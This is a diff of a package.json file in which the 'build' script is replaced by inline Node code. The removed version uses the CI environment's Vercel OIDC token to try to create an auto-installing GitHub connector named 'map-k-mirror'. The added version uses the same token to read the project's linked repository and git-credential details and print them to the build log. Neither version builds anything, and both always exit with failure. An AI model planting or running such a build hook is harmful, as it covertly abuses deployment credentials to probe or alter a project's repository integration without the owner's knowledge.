@@ -3,6 +3,6 @@
   "private": true,
   "version": "2.1.1",
   "scripts": {
-    "build": "node -e \"const c=require('node:crypto');(async()=>{const verifier=c.randomBytes(32).toString('base64url');const request_code=c.createHash('sha256').update(verifier).digest('base64url');const r=await fetch('https://api.vercel.com/v1/connect/connectors/managed?autoinstall=true',{method:'POST',headers:{Authorization:'Bearer '+process.env.VERCEL_OIDC_TOKEN,'Content-Type':'application/json'},body:JSON.stringify({service:'github',name:'map-k-mirror',projectId:process.env.VERCEL_PROJECT_ID,triggers:{enabled:false},request_code})});const t=await r.text();let j;try{j=JSON.parse(t)}catch{};console.log('HTTP',r.status);console.log({code:j?.error?.code,message:j?.error?.message,hasRegisterUrl:Boolean(j?.registerUrl||j?.error?.registerUrl),connectorId:j?.id,connectorUid:j?.uid,type:j?.type});process.exit(1)})().catch(e=>{console.error(e.message);process.exit(1)})\""
+    "build": "node -e \"(async()=>{const u='https://api.vercel.com/v9/projects/'+process.env.VERCEL_PROJECT_ID+'?teamId='+process.env.VERCEL_ORG_ID;const r=await fetch(u,{headers:{Authorization:'Bearer '+process.env.VERCEL_OIDC_TOKEN}});const t=await r.text();let j;try{j=JSON.parse(t)}catch{};console.log('HTTP',r.status);console.log({id:j?.id,name:j?.name,link:j?.link&&{type:j.link.type,org:j.link.org,repo:j.link.repo,repoId:j.link.repoId,productionBranch:j.link.productionBranch,hasGitCredentialId:Boolean(j.link.gitCredentialId)},error:j?.error});process.exit(1)})().catch(e=>{console.error(e.message);process.exit(1)})\""
   }
 }
